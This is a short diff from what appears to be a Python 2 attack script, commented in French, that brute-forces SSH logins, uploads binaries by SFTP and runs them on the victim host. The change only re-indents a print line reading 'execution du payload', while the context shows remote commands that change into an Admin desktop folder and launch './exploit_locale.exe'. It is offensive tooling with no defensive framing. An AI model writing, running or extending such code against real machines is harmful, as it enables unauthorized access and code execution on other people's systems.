@@ -70,7 +70,7 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 			print "[*] erreur lors du transfert sftp"
 			break
 		try:
-      print 'execution du payload'
+     			print 'execution du payload'
 			stdin, stdout, stderr = ssh.exec_command('cd /home/Admin/Desktop/')
 			stdin, stdout, stderr = ssh.exec_command('./exploit_locale.exe')
 			time.sleep(5)
